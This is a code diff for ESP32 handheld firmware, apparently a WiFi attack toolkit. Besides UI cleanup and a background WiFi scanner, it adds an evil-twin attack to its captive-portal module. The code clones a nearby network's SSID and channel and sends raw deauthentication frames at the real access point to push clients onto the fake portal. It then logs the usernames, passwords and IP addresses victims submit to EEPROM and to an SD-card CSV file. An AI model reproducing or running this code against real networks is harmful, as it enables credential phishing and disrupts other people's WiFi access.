-            } 
+            }
         }
         tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
         uiDrawn = true;
     }
 
-    // Non-blocking animation state machine
     static unsigned long lastAnimationTime = 0;
-    static int animationState = 0;  // 0: idle, 1: black, 2: white
+    static int animationState = 0;
     static int activeIcon = -1;
 
     if (animationState > 0 && millis() - lastAnimationTime >= 150) {
@@ -1174,23 +1518,14 @@ void runUI() {
             tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
             animationState = 2;
 
-            // Execute action after animation
             switch (activeIcon) {
                 case 0:
-                    displayPrint("[!] Scanning Stopped", TFT_RED, true);
-                    displayPrint("[!] Press [Select] to Exit", TFT_RED, false);
+                    displayPrint("[!] Scanning Stopped", UI_WARN, true);
+                    displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
                     stopScan = true;
                     animationState = 0;
                     activeIcon = -1;
                     break;
-                    
-                case 1: // Back icon action (exit to submenu)   
-                    displayPrint("[!] Scanning Stopped", TFT_RED, true);  
-                    stopScan = true;      
-                    feature_exit_requested = true;
-                    animationState = 0;
-                    activeIcon = -1;
-                    break;            
             }
         } else if (animationState == 2) {
             animationState = 0;
@@ -1199,24 +1534,28 @@ void runUI() {
         lastAnimationTime = millis();
     }
 
-    // Throttle touchscreen polling
     static unsigned long lastTouchCheck = 0;
-    const unsigned long touchCheckInterval = 50;  // Check every 50ms
+    const unsigned long touchCheckInterval = 50;
 
     if (millis() - lastTouchCheck >= touchCheckInterval) {
-        if (ts.touched() && feature_active) {
-            TS_Point p = ts.getPoint();
-            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+        int x, y;
+        if (feature_active && readTouchXY(x, y)) {
             if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                 for (int i = 0; i < ICON_NUM; i++) {
                     if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                         if (icons[i] != NULL && animationState == 0) {
-                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-                            animationState = 1;
-                            activeIcon = i;
-                            lastAnimationTime = millis();
+
+                            if (i == 1) {
+                                displayPrint("[!] Scanning Stopped", UI_WARN, true);
+                                stopScan = true;
+                                exitMode = true;
+                            } else {
+
+                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                                animationState = 1;
+                                activeIcon = i;
+                                lastAnimationTime = millis();
+                            }
                         }
                         break;
                     }
@@ -1255,7 +1594,7 @@ void deauthdetectSetup() {
   tft.fillScreen(TFT_BLACK);
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
 
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
   pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -1274,40 +1613,45 @@ void deauthdetectSetup() {
 }
 
 void deauthdetectLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    stopScan = true;
+    exitMode = true;
+  }
+
   checkButtonPress();
 
   if (stopScan || exitMode) {
-    vTaskDelete(wifiScanTaskHandle);
-    wifiScanTaskHandle = NULL;
-    vTaskDelete(uiTaskHandle);
-    uiTaskHandle = NULL;
-    vTaskDelete(statusBarTaskHandle);
+
+    if (wifiScanTaskHandle != NULL) {
+      vTaskDelete(wifiScanTaskHandle);
+      wifiScanTaskHandle = NULL;
+    }
+    if (uiTaskHandle != NULL) {
+      vTaskDelete(uiTaskHandle);
+      uiTaskHandle = NULL;
+    }
+    if (statusBarTaskHandle != NULL) {
+      vTaskDelete(statusBarTaskHandle);
+      statusBarTaskHandle = NULL;
+    }
+
     esp_wifi_set_promiscuous(false);
     WiFi.disconnect();
     stopScan = false;
     exitMode = false;
     lineIndex = 0;
     delay(10);
-   }
- }
+
+    feature_exit_requested = true;
+  }
 }
-
-
-/*
-   WifiScan
-
-
-*/
+}
 
 namespace WifiScan {
 
 #define TFT_WIDTH 240
 #define TFT_HEIGHT 320
-
-#define BTN_UP 6
-#define BTN_DOWN 3
-#define BTN_RIGHT 5
-#define BTN_LEFT 4
 
 #define SCREEN_WIDTH  240
 #define SCREENHEIGHT 320
@@ -1321,6 +1665,85 @@ int listStartIndex = 0;
 bool isDetailView = false;
 bool isScanning = false;
 bool exitRequested = false;
+
+static TaskHandle_t bgScanTaskHandle = nullptr;
+static volatile bool bgHasResults = false;
+static volatile uint32_t bgLastScanMs = 0;
+static const uint32_t BG_SCAN_INTERVAL_MS = 15000;
+
+static const uint32_t BG_BOOT_GRACE_MS = 6000;
+static volatile bool bgScanRunning = false;
+static uint32_t bgBootMs = 0;
+
+static void bgWifiScanTask(void* ) {
+  for (;;) {
+    const uint32_t now = millis();
+    if (bgBootMs == 0) bgBootMs = now;
+
+    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
+    if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {
+
+      if (!bgScanRunning) {
+        WiFi.mode(WIFI_STA);
+        WiFi.disconnect();
+        WiFi.scanDelete();
+        int ret = WiFi.scanNetworks(true, true);
+
+        bgScanRunning = (ret == WIFI_SCAN_RUNNING);
+        if (ret >= 0) {
+
+          bgHasResults = true;
+          bgLastScanMs = now;
+          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
+        } else if (!bgScanRunning) {
+
+          vTaskDelay(2000 / portTICK_PERIOD_MS);
+        } else {
+          vTaskDelay(250 / portTICK_PERIOD_MS);
+        }
+      } else {
+        int n = WiFi.scanComplete();
+        if (n >= 0) {
+          bgHasResults = true;
+          bgLastScanMs = now;
+          bgScanRunning = false;
+          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
+        } else if (n == WIFI_SCAN_FAILED) {
+          bgScanRunning = false;
+          WiFi.scanDelete();
+          vTaskDelay(2000 / portTICK_PERIOD_MS);
+        } else {
+
+          vTaskDelay(250 / portTICK_PERIOD_MS);
+        }
+      }
+    } else {
+
+      bgScanRunning = false;
+      vTaskDelay(1000 / portTICK_PERIOD_MS);
+    }
+  }
+}
+
+void startBackgroundScanner() {
+  if (bgScanTaskHandle != nullptr) return;
+  xTaskCreatePinnedToCore(
+    bgWifiScanTask,
+    "bgWifiScan",
+    4096,
+    nullptr,
+    1,
+    &bgScanTaskHandle,
+    0
+  );
+}
+
+int getLastCount() {
+
+  if (!settings().autoWifiScan) return 0;
+  int n = WiFi.scanComplete();
+  return (n < 0) ? 0 : n;
+}
 
 unsigned long scan_StartTime = 0;
 const unsigned long scanTimeout = 2000;
@@ -1337,7 +1760,7 @@ static bool uiDrawn = false;
 static int iconX[ICON_NUM] = {210, 10};
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_undo,
-  bitmap_icon_go_back // Added back icon
+  bitmap_icon_go_back
 };
 
 void displayWiFiList(bool fullRedraw = false) {
@@ -1441,7 +1864,7 @@ void displayScanning() {
   tft.print("[+] Scan complete!");
 
   delay(100);
-  
+
   tft.setCursor(10, STATUS_BAR_Y_OFFSET + 55);
   tft.print("[+] Wait a moment");
   isScanning = false;
@@ -1457,6 +1880,12 @@ void startWiFiScan() {
   int numNetworks = WiFi.scanNetworks(false, true);
 
   isScanning = false;
+
+  if (numNetworks >= 0) {
+    bgHasResults = true;
+    bgLastScanMs = millis();
+  }
+
   displayWiFiList(true);
 }
 
@@ -1568,16 +1997,14 @@ void handleButton() {
   }
 }
 
-
-
 void runUI() {
 
     static int iconY = STATUS_BAR_Y_OFFSET;
-    
+
     if (!uiDrawn) {
         tft.drawLine(0, 19, 240, 19, TFT_WHITE);
         tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);
-        
+
         for (int i = 0; i < ICON_NUM; i++) {
             if (icons[i] != NULL) {
                 tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
@@ -1588,7 +2015,7 @@ void runUI() {
     }
 
     static unsigned long lastAnimationTime = 0;
-    static int animationState = 0;  
+    static int animationState = 0;
     static int activeIcon = -1;
 
     if (animationState > 0 && millis() - lastAnimationTime >= 150) {
@@ -1602,9 +2029,6 @@ void runUI() {
                         startWiFiScan();
                     }
                     break;
-                case 1: // Back icon action (exit to submenu)
-                    feature_exit_requested = true;
-                    break;
             }
         } else if (animationState == 2) {
             animationState = 0;
@@ -1614,22 +2038,25 @@ void runUI() {
     }
 
     static unsigned long lastTouchCheck = 0;
-    const unsigned long touchCheckInterval = 50; 
+    const unsigned long touchCheckInterval = 50;
 
     if (millis() - lastTouchCheck >= touchCheckInterval) {
-        if (ts.touched() && feature_active) {
-            TS_Point p = ts.getPoint();
-            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+        int x, y;
+        if (feature_active && readTouchXY(x, y)) {
             if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                 for (int i = 0; i < ICON_NUM; i++) {
                     if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                         if (icons[i] != NULL && animationState == 0) {
-                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-                            animationState = 1;
-                            activeIcon = i;
-                            lastAnimationTime = millis();
+
+                            if (i == 1) {
+                                feature_exit_requested = true;
+                            } else {
+
+                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                                animationState = 1;
+                                activeIcon = i;
+                                lastAnimationTime = millis();
+                            }
                         }
                         break;
                     }
@@ -1641,18 +2068,13 @@ void runUI() {
 }
 
 void wifiscanSetup() {
-  
-  tft.setRotation(0);
+
   tft.fillScreen(TFT_BLACK);
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setTextSize(1);
   tft.fillRect(0, 20, 140, 16, DARK_GRAY);
 
   uiDrawn = false;
-
-  float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
-  runUI();
 
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
   pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -1664,18 +2086,32 @@ void wifiscanSetup() {
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
 
-  startWiFiScan();
+  int existing = WiFi.scanComplete();
+  if (existing >= 0 && bgHasResults) {
+    displayWiFiList(true);
+  } else {
+    startWiFiScan();
+  }
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  runUI();
 }
 
 void wifiscanLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
   static bool lastDetailView = false;
   static bool lastScanning = true;
 
   handleButton();
-  updateStatusBar();
   runUI();
-  //delay(10);
+  updateStatusBar();
 
   if (isScanning) {
     if (!lastScanning) {
@@ -1697,32 +2133,47 @@ void wifiscanLoop() {
   }
 }
 
-
-
-/*
- * 
- * 
- * Captive Portal
- * 
- * 
-*/
-
 namespace CaptivePortal {
 
 const char* default_ssid = "ESP32DIV_AP";
 char custom_ssid[32] = "ESP32DIV_AP";
 const char* password = NULL;
+
+static uint8_t ap_channel = 1;
+
+static bool cp_deauth_active = false;
+static wifi_ap_record_t cp_target_ap;
+static uint8_t cp_target_channel;
+static uint32_t cp_deauth_packet_count = 0;
+static uint32_t cp_deauth_success_count = 0;
+static unsigned long cp_last_deauth_time = 0;
+
+static uint8_t cp_deauth_frame_default[26] = {
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00,
+    0x01, 0x00
+};
+static uint8_t cp_deauth_frame[sizeof(cp_deauth_frame_default)];
 DNSServer dnsServer;
 const byte DNS_PORT = 53;
 WebServer server(80);
-bool attackActive = true;
+
+bool attackActive = false;
+
+static void stopAttack();
+static void startAttack();
+void drawMainMenu();
 
 #define EEPROM_SIZE 1440
 #define SSID_ADDR 0
 #define CRED_ADDR 32
 #define COUNT_ADDR 1248
 #define MAX_CREDS 20
-#define CRED_SIZE 64 // 16 (user) + 16 (pass) + 32 (SSID)
+#define CRED_SIZE 64
 
 String terminalBuffer[MAX_LINES];
 uint16_t colorBuffer[MAX_LINES];
@@ -1848,7 +2299,199 @@ void saveCredential(String username, String password, String ssid) {
   }
 }
 
-// WebServer handler functions
+static bool cp_sd_mounted = false;
+
+static bool cpMountSD() {
+
+  if (cp_sd_mounted) {
+    if (SD.exists("/")) return true;
+    cp_sd_mounted = false;
+  }
+
+  bool ok = false;
+  #ifdef SD_CS
+  ok = SD.begin(SD_CS);
+  #endif
+  #ifdef SD_CS_PIN
+  if (!ok) {
+    #ifdef CC1101_CS
+    if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
+    #else
+    ok = SD.begin(SD_CS_PIN);
+    #endif
+  }
+  #endif
+  cp_sd_mounted = ok;
+  return ok;
+}
+
+static bool cpEnsureDir(const char* dirPath) {
+  if (!cpMountSD()) return false;
+  if (!SD.exists(dirPath)) {
+    if (SD.mkdir(dirPath)) return true;
+
+    if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
+    return false;
+  }
+  return true;
+}
+
+static String cpCsvEscape(const String& s) {
+  bool needsQuotes = false;
+  for (size_t i = 0; i < s.length(); i++) {
+    char c = s[i];
+    if (c == ',' || c == '"' || c == '\n' || c == '\r') { needsQuotes = true; break; }
+  }
+  if (!needsQuotes) return s;
+
+  String out = "\"";
+  for (size_t i = 0; i < s.length(); i++) {
+    char c = s[i];
+    if (c == '"') out += "\"\"";
+    else out += c;
+  }
+  out += "\"";
+  return out;
+}
+
+static bool cpAppendLineToFile(const char* path, const String& line) {
+  if (!cpMountSD()) return false;
+
+  File f = SD.open(path, "a");
+  if (!f) {
+    cp_sd_mounted = false;
+    if (!cpMountSD()) return false;
+    f = SD.open(path, "a");
+    if (!f) return false;
+  }
+
+  bool ok = (f.print(line) > 0);
+  f.flush();
+  f.close();
+  return ok;
+}
+
+static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
+  const char* dir = "/captive_portal";
+  const char* path = "/captive_portal/captured.csv";
+  if (!cpEnsureDir(dir)) return false;
+
+  bool exists = SD.exists(path);
+  if (!exists) {
+    if (!cpAppendLineToFile(path, "millis,remote_ip,ssid,username,password\r\n")) return false;
+  }
+
+  String row;
+  row.reserve(32 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length());
+  row += String(millis());
+  row += ",";
+  row += cpCsvEscape(remoteIp);
+  row += ",";
+  row += cpCsvEscape(ssid);
+  row += ",";
+  row += cpCsvEscape(username);
+  row += ",";
+  row += cpCsvEscape(passwordStr);
+  row += "\r\n";
+  return cpAppendLineToFile(path, row);
+}
+
+static bool cpDumpAllCredentialsToSD(int* outCount) {
+  if (outCount) *outCount = 0;
+  const char* dir  = "/captive_portal";
+  const char* path = "/captive_portal/eeprom_dump.csv";
+  if (!cpEnsureDir(dir)) return false;
+
+  int count = EEPROM.read(COUNT_ADDR);
+  if (count < 0) count = 0;
+  if (count > MAX_CREDS) count = MAX_CREDS;
+
+  File f = SD.open(path, "w");
+  if (!f) {
+    cp_sd_mounted = false;
+    if (!cpMountSD()) return false;
+    f = SD.open(path, "w");
+    if (!f) return false;
+  }
+
+  f.print("index,ssid,username,password\r\n");
+  for (int i = 0; i < count; i++) {
+    Credential cred;
+    EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
+    String line;
+    line.reserve(16 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
+    line += String(i);
+    line += ",";
+    line += cpCsvEscape(String(cred.ssid));
+    line += ",";
+    line += cpCsvEscape(String(cred.username));
+    line += ",";
+    line += cpCsvEscape(String(cred.password));
+    line += "\r\n";
+    f.print(line);
+  }
+  f.flush();
+  f.close();
+  if (outCount) *outCount = count;
+  return true;
+}
+
+static void cpCredListStatus(const String& msg, uint16_t color) {
+  const int y = 272;
+  tft.fillRect(0, y, 240, 16, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(2, y + 4);
+  tft.print(msg);
+}
+
+static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
+  if (cp_deauth_active) return;
+
+  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
+  strcpy((char*)cp_target_ap.ssid, ssid.c_str());
+  memcpy(cp_target_ap.bssid, bssid, 6);
+  cp_target_ap.primary = channel;
+  cp_target_channel = channel;
+
+  cp_deauth_active = true;
+  cp_deauth_packet_count = 0;
+  cp_deauth_success_count = 0;
+  cp_last_deauth_time = 0;
+
+  Serial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
+}
+
+static void cpStopDeauth() {
+  if (!cp_deauth_active) return;
+
+  cp_deauth_active = false;
+  Serial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
+                (unsigned)cp_deauth_packet_count, (unsigned)cp_deauth_success_count);
+}
+
+static void cpSendDeauthFrame() {
+  if (!cp_deauth_active) return;
+
+  esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);
+
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
+  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
+  cp_deauth_frame[26] = 7;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
+  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
+
+  memset(&cp_deauth_frame[4], 0xFF, 6);
+  cp_deauth_frame[26] = 7;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+
+  cp_deauth_packet_count += 2;
+}
+
 static void handleGenerate204() {
   Serial.println("Android /generate_204 requested");
   displayPrint("Android /generate_204 requested", GREEN, false);
@@ -1895,11 +2538,17 @@ static void handleRoot() {
 static void handleLoginPost() {
   String username = server.arg("username");
   String password = server.arg("password");
+  String remoteIp = server.client().remoteIP().toString();
   Serial.println("Captured Credentials:");
   Serial.println("Username: " + username);
   Serial.println("Password: " + password);
   Serial.println("SSID: " + String(custom_ssid));
   saveCredential(username, password, custom_ssid);
+  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
+    Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
+  } else {
+    Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
+  }
   server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
 }
 
@@ -1908,7 +2557,6 @@ static void handleNotFound() {
   server.sendHeader("Location", "/login.html", true);
   server.send(302, "text/plain", "");
 }
-
 
 void setupWebServer() {
   server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
@@ -1921,7 +2569,6 @@ void setupWebServer() {
   server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
   server.onNotFound(static_cast<void (*)()>(handleNotFound));
 }
-
 
 void loadSSID() {
   String savedSSID = "";
@@ -1949,7 +2596,7 @@ void saveSSID(String ssid) {
   ssid.toCharArray(custom_ssid, 32);
   if (attackActive) {
     WiFi.softAPdisconnect(true);
-    WiFi.softAP(custom_ssid, password);
+    WiFi.softAP(custom_ssid, password, ap_channel);
     Serial.println("New SSID set: " + String(custom_ssid));
   }
 }
@@ -1977,16 +2624,203 @@ void deleteCredential(int index) {
 void clearAllCredentials() {
   EEPROM.put(COUNT_ADDR, (uint32_t)0);
 
-  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE); 
+  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE);
   if (endAddr > COUNT_ADDR) {
     Serial.println("Error: Credential clear would overwrite counter!");
-    endAddr = COUNT_ADDR; 
+    endAddr = COUNT_ADDR;
   }
   for (int i = CRED_ADDR; i < endAddr; i++) {
     EEPROM.write(i, 0);
   }
   EEPROM.commit();
   Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
+}
+
+static void cpDrawCloneFrame(const char* title) {
+  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(8, 45);
+  tft.println(title);
+}
+
+static void cpDrawCloneFooter(bool prevEnabled, bool nextEnabled) {
+
+  FeatureUI::drawFooterBg();
+
+  FeatureUI::Button btns[4];
+
+  FeatureUI::layoutFooter4(
+    btns,
+    "Back", FeatureUI::ButtonStyle::Secondary,
+    "Scan", FeatureUI::ButtonStyle::Secondary,
+    "Prev", FeatureUI::ButtonStyle::Secondary,
+    "Next", FeatureUI::ButtonStyle::Secondary,
+    false, false, !prevEnabled, !nextEnabled
+  );
+
+  for (int i = 0; i < 4; ++i) {
+    FeatureUI::drawButtonRect(btns[i].x, btns[i].y, btns[i].w, btns[i].h,
+                              btns[i].label, btns[i].style,
+                              false, btns[i].disabled,
+                              1);
+  }
+}
+
+static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
+  const int MAX_RESULTS = 40;
+  const int rowsPerPage = 12;
+
+  while (true) {
+
+    if (feature_active && isButtonPressed(BTN_SELECT)) return false;
+
+    cpDrawCloneFrame("Scanning...");
+    loading(90, ORANGE, 0, 0, 2, true);
+
+    WiFi.scanDelete();
+    int n = WiFi.scanNetworks(false, true);
+    if (n <= 0) {
+      cpDrawCloneFrame("No networks found");
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(8, 62);
+      tft.println("Tap Scan, or Back.");
+      cpDrawCloneFooter(false, false);
+
+      int x, y;
+      while (!readTouchXY(x, y)) delay(10);
+      delay(200);
+      const int footerY = tft.height() - FeatureUI::FOOTER_H;
+      if (y >= footerY) {
+        if (x < 60) return false;
+        if (x < 120) continue;
+      }
+      continue;
+    }
+
+    int count = min(n, MAX_RESULTS);
+    int idx[MAX_RESULTS];
+    for (int i = 0; i < count; i++) idx[i] = i;
+
+    for (int i = 0; i < count - 1; i++) {
+      int best = i;
+      for (int j = i + 1; j < count; j++) {
+        if (WiFi.RSSI(idx[j]) > WiFi.RSSI(idx[best])) best = j;
+      }
+      if (best != i) {
+        int tmp = idx[i];
+        idx[i] = idx[best];
+        idx[best] = tmp;
+      }
+    }
+
+    int page = 0;
+    while (true) {
+      if (feature_active && isButtonPressed(BTN_SELECT)) return false;
+
+      cpDrawCloneFrame("Clone Access Point");
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(8, 62);
+      tft.println("Tap a network to clone SSID+CH");
+
+      int totalPages = (count + rowsPerPage - 1) / rowsPerPage;
+      tft.setTextColor(GREEN, TFT_BLACK);
+      tft.setCursor(180, 45);
+      tft.printf("%d/%d", page + 1, max(1, totalPages));
+
+      int y = 80;
+      int start = page * rowsPerPage;
+      int end = min(start + rowsPerPage, count);
+      for (int row = start; row < end; row++) {
+        int real = idx[row];
+        String ssid = WiFi.SSID(real);
+        int rssi = WiFi.RSSI(real);
+        int ch = WiFi.channel(real);
+        uint8_t auth = WiFi.encryptionType(real);
+        const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "SEC";
+
+        String disp = ssid;
+        if (disp.length() > 14) disp = disp.substring(0, 14) + "...";
+
+        char buf[64];
+        snprintf(buf, sizeof(buf), "%02d %-17s %3d Ch%2d %s", row + 1, disp.c_str(), rssi, ch, enc);
+
+        uint16_t color = (auth == WIFI_AUTH_OPEN) ? ORANGE : TFT_WHITE;
+        tft.setTextColor(color, TFT_BLACK);
+        tft.setCursor(8, y);
+        tft.println(buf);
+        y += 16;
+      }
+
+      bool prevEnabled = page > 0;
+      bool nextEnabled = (page + 1) * rowsPerPage < count;
+      cpDrawCloneFooter(prevEnabled, nextEnabled);
+
+      int tx, ty;
+      while (!readTouchXY(tx, ty)) delay(10);
+      delay(200);
+
+      const int footerY = tft.height() - FeatureUI::FOOTER_H;
+      if (ty >= footerY) {
+        if (tx < 60) return false;
+        if (tx < 120) break;
+        if (tx < 180 && prevEnabled) { page--; continue; }
+        if (tx >= 180 && nextEnabled) { page++; continue; }
+        continue;
+      }
+
+      if (ty >= 80 && ty < 80 + (rowsPerPage * 16)) {
+        int clickedOffset = (ty - 80) / 16;
+        int absoluteRow = page * rowsPerPage + clickedOffset;
+        if (absoluteRow >= start && absoluteRow < end) {
+          int real = idx[absoluteRow];
+          outSsid = WiFi.SSID(real);
+          outChannel = (uint8_t)WiFi.channel(real);
+
+          memcpy(outBssid, WiFi.BSSID(real), 6);
+          return true;
+        }
+      }
+    }
+  }
+}
+
+static void cpCloneExistingAPFlow() {
+  bool wasActive = attackActive;
+  if (attackActive) stopAttack();
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true);
+  delay(100);
+
+  String chosen;
+  uint8_t ch = 1;
+  uint8_t bssid[6] = {0};
+  bool ok = cpCloneScanAndSelect(chosen, ch, bssid);
+  WiFi.scanDelete();
+
+  if (!ok) {
+    if (wasActive) startAttack();
+    drawMainMenu();
+    return;
+  }
+
+  ap_channel = (ch == 0 ? 1 : ch);
+  saveSSID(chosen);
+  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
+
+  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
+  strcpy((char*)cp_target_ap.ssid, chosen.c_str());
+  memcpy(cp_target_ap.bssid, bssid, 6);
+  cp_target_ap.primary = ap_channel;
+
+  cpStartDeauth(chosen, bssid, ap_channel);
+
+  delay(500);
+
+  startAttack();
+  drawMainMenu();
 }
 
 void drawMainMenu() {
@@ -1999,8 +2833,13 @@ void drawMainMenu() {
   displayPrint(custom_ssid, WHITE, false);
   displayPrint("...", GREEN, false);
 
+  displayPrint("Channel: " + String(ap_channel), GREEN, false);
   displayPrint(attackActive ? "Status: Active" : "Status: Inactive", GREEN, false);
-
+  if (cp_deauth_active) {
+    char buf[32];
+    snprintf(buf, sizeof(buf), "Evil Twin: %u pkts", (unsigned)cp_deauth_packet_count);
+    displayPrint(buf, ORANGE, false);
+  }
 }
 
 void drawInputField() {
@@ -2049,26 +2888,23 @@ void drawKeyboard() {
     yOffset += keyHeight + keySpacing;
   }
 
-tft.setTextColor(ORANGE); 
-tft.setTextSize(1); 
-tft.setTextDatum(MC_DATUM); 
+tft.setTextColor(ORANGE);
+tft.setTextSize(1);
+tft.setTextDatum(MC_DATUM);
 
-// Back Button
-tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY); 
-tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE); 
-tft.drawString("Back", 40, 197); 
+tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY);
+tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE);
+tft.drawString("Back", 40, 197);
 Serial.printf("Back button at x=5-75, y=185-210\n");
 
-// Series Button
-tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY); 
-tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE); 
-tft.drawString("Shuffle", 120, 197); 
+tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY);
+tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE);
+tft.drawString("Shuffle", 120, 197);
 Serial.printf("Series button at x=85-155, y=185-210\n");
 
-// OK Button
-tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY); 
-tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE); 
-tft.drawString("OK", 200, 197); 
+tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY);
+tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE);
+tft.drawString("OK", 200, 197);
 Serial.printf("OK button at x=165-235, y=185-210\n");
 }
 
@@ -2103,7 +2939,7 @@ void drawCredList() {
       EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
       Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                     i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);
-                    
+
       tft.setTextColor(TFT_WHITE);
       tft.setCursor(0, yOffset);
       tft.println(cred.username);
@@ -2112,8 +2948,7 @@ void drawCredList() {
       tft.setCursor(160, yOffset);
       tft.println(cred.ssid);
 
-      //tft.fillRect(225, yOffset - 3, 7, 7, TFT_RED);
-      tft.setTextColor(TFT_RED);
+      tft.setTextColor(UI_WARN);
       tft.setCursor(223, yOffset - 1);
       tft.println("X");
 
@@ -2121,13 +2956,13 @@ void drawCredList() {
     }
   }
 
-int buttonY = 290; 
-tft.setTextColor(ORANGE); 
-tft.setTextSize(1); 
-tft.setTextDatum(MC_DATUM); 
+int buttonY = 290;
+tft.setTextColor(ORANGE);
